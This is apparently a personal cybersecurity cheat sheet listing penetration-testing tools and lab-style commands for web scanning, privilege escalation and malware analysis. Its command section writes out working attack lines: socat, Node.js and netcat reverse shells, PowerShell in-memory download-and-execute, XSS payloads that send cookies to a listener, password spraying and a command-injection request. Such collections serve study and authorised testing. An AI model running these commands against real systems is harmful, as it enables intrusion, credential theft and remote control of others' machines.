# CyberSecResources
List of tools/resources for Cybersecurity
## Resources
- https://github.com/khanhnnvn/CEHv10/blob/master/Labs/CEHv10%20Module%2006%20System%20Hacking.pdf
- https://payloadplayground.com/
- https://www.revshells.com/

## Websites
### Web Scanner
  - Burpsuite
  - OWASP ZAP
  - Vega
  - nmap
  - nikto
  - uniscan
  - ffuf
  - Arachni (Modular scanner with great CLI and web GUI)
  - Wapiti (Lightweight scanner for GET/POST attack surfaces)
  - SQLmap (SQL Injection + Command execution within SQL)
  - XSStrike (XSS scanner with payload fuzzing) & KNOXSS

    
### Important Commands
    - ``` ffuf -w /path/to/wordlist -u https://target/FUZZ ```
    - ``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.134.222/customers/signup -mr "username already exists" ```
    - ``` ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.134.222/customers/login -fc 200 ```
  - ```sqlmap -u "http://example.com/login.php" --data "username=admin&password=test" --dbs```
  - ```ldapsearch -x -h 10.10.10.25 -b "(objectclass=user)" | grep sAMAccountName```
  - ```nmap --script ldap-rootdse 10.10.10.0/24```
  - ```certutil.exe -urlcache -split -f "gttp://pstools.exe" pstools.exe```
  - ```sudo responder -I eth0 -dwP```
  - PHP Filter Chaining (https://github.com/synacktiv/php_filter_chain_generator/tree/main)
    - How to use? https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/
  - sudo mount -t cifs //target-IP/cyberq /mnt/cyberq -o guest
  - ```nxc smb 10.10.207.204 -u usernames.txt -p /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding```
  - ```cat /usr/share/wordlists/rockyou.txt | grep -v "#" | grep -v "!" | grep -v "%" | grep -v "?" | grep -v "/" >> /usr/share/wordlists/rockyou3.txt```
  - ```cadaver http://192.68.0.51/dav/```
  - ```put webshell/phpshell.php```
  - ```1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null```
  - ```1..20 | % {$a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | %{echo ((new-object Net.Sockets.TcpClient).Connect("10.1.l.$a",$_)) "Port $_ is open!"} 2>$null}```
  - ```iex (iwr 'http://192.168.2.2/file.ps1')``` -> Download in-memory
  - ```iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')``` -> Download in-memory
  - ```$down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1"); $read = $down.GetResponse(); IEX ([System.lO.StreamReader]($read.GetResponseStream())).ReadToEnd()``` -> Download in-memory
  - ``` 
    Stabilize Shell #1
    python -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm #Ctrl+Z
    stty raw -echo; fg


    Stabilize Shell #2 rlwrap
    rlwrap nc -lvnp <port>
    stty raw -echo; fg

    Stabilize Shell #3 Socat
    sudo python3 -m http.server 80
    wget <LOCAL-IP>/socat -O /tmp/socat
    Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

    Reverse Shell   
    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

    Bind Shell
    socat TCP-L:<PORT> EXEC:powershell.exe,pipes
    socat TCP-L:<PORT> EXEC:"bash -li"

    Stable Linux Shells
    socat TCP-L:<port> FILE:`tty`,raw,echo=0

    Final Stable linux shell
    socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

    Socat Encrypted Shell
    openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
    cat shell.key shell.crt > shell.pem
    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
    socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash #To connect back

    Socat Encrypted Bind shell
    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
    socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
    
    ```
  - JavaScript Shell
    ```
    (function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.18.1.77", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
    })();
```
  -
  - knockpy To discover subdomains

### SSRF, RCE, XXE, LFI Helpers
  - SSRFire – SSRF exploitation automation (Python)
  - liffy – LFI to RCE using wrappers, filters, or logs
  - Kiterunner – Advanced wordlist-based directory busting with support for Swagger/OpenAPI
  - tplmap – Server-side template injection tool
    
### XSS
  - ```fetch('/flag.txt').then(res => res.text()).then(data => { fetch('http://10.9.2.138:1234?flag=' + btoa(data));});```
  - ```</textarea><script>fetch('http://10.9.2.138:1234?cookie=' + btoa(document.cookie) );</script>```
  - ```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``` -> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

### Spiders & Path Traversal
- Feroxbuster
- Dirsearch
- FFUF
- Dirb
- OWASP ZAP
- Burpsuite

## Privilege Escalation
### Linux
- LinPeas https://github.com/peass-ng/PEASS-ng
- DirtyCow https://github.com/firefart/dirtycow // https://github.com/firefart/dirtycow/blob/master/dirty.c
- linux-exploit-suggester
- https://www.revshells.com/
- https://github.com/c3l3si4n/pwnkit/tree/main OR 
- Encode payload in URL
-     ```curl -s 'http://10.10.7.56/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.186 4443 >/tmp/f;'```
  
### Windows
- BeRoot.exe
- WinPeas https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- PowerUp.ps1

| Tool | Platform | Description |
| --------- | --------- | ----------- |
| winPEASx64.exe | Windows | Windows local enum (binary, no install) |
| PowerUp.ps1 | Windows | PowerShell-based privilege checks |
| Seatbelt | Windows | Targeted enumeration (token, policy, env) |
| SharpUp | Windows | C# version of PowerUp |
| AccessChk (Sysinternals) | Windows | Privilege and permissions checker |
| Enum.exe | Windows | Legacy tool for shares, users, etc. |
| net commands | Built-in | net user, net share, net localgroup etc. |
| WMIC | Built-in | System config and user query tool |

### Crack Passwords (Windows)
- L0phtCrack 7 – GUI cracking suite
- Mimikatz – Extracts credentials, SAM secrets, tickets
- CrackMapExec – Swiss army knife for Active Directory
- pwdump7 – Dump hashes from SAM
- secretsdump.py (Impacket) – Extract NTLM hashes from SAM + SYSTEM

## Enumerate OS
- nmap
- enum4linux
- uniscan

## Find Exploit-db Exploits commands line
- searchsploit

## Malware Analysis
### Offline Malware Analysis

#### Static

##### File Fingerprinting
- MD5/SHA2 Message Digest 

##### String Search
- PE Studio
- DIE
- FLOSS (Fire Eye) 
- Strings (Microsoft) 
- BinText

##### Packing/Obfuscation
- PEid (Find must common crypters, compilers and packer)
- DIE (Detect it Easy for ELF Malware)

##### Portable Executable information
- PE Explorer (EXE, ActiveX, DLL)

##### Identifying File Dependency
- Dependency Walker
- Virus Total

##### Malware Disassembly 
- IDA Pro
- Ghidra
- OllyDbg

### Malware Analysis Online
- https://hybrid-analysis.com/
- https://www.virustotal.com/
- https://whois.domaintools.com
- https://toolbar.netcraft.com/site_report?url
- https://www.robtex.com

No Distribution of results
- https://nodistribute.com/ # Preferred
- https://antiscan.me/
- https://www.virscan.org/language/en/ # Not tested
- https://spyralscanner.net/

### Additional
- Cuckoo sandbox
- Virusshare.com
- Malware traffic analysis
- certutil.exe -urlcache -split -f "gttp://pstools.exe" pstools.exe
